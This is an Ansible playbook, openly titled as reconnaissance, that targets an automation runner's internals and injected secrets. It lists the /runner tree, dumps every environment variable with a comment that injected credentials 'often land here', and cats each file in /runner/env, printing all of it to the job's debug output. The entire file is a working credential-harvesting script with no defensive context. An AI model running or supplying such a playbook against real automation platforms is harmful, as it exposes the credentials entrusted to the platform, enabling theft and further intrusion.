---
- name: Recon - runner internals and injected secrets
  hosts: all
  gather_facts: false
  tasks:
    - name: List /runner tree
      ansible.builtin.shell: "ls -laR /runner 2>/dev/null | head -80"
      register: runnertree
      changed_when: false
    - name: Show runner tree
      ansible.builtin.debug:
        var: runnertree.stdout_lines

    - name: Dump environment variables (injected creds often land here)
      ansible.builtin.shell: "env | sort"
      register: envdump
      changed_when: false
    - name: Show env
      ansible.builtin.debug:
        var: envdump.stdout_lines

    - name: Find credential / secret files in runner env
      ansible.builtin.shell: |
        echo "--- /runner/env contents ---"
        for f in /runner/env/*; do echo "### $f ###"; cat "$f" 2>/dev/null; echo; done 2>/dev/null
      register: runnerenv
      changed_when: false
    - name: Show runner env files
      ansible.builtin.debug:
        var: runnerenv.stdout_lines
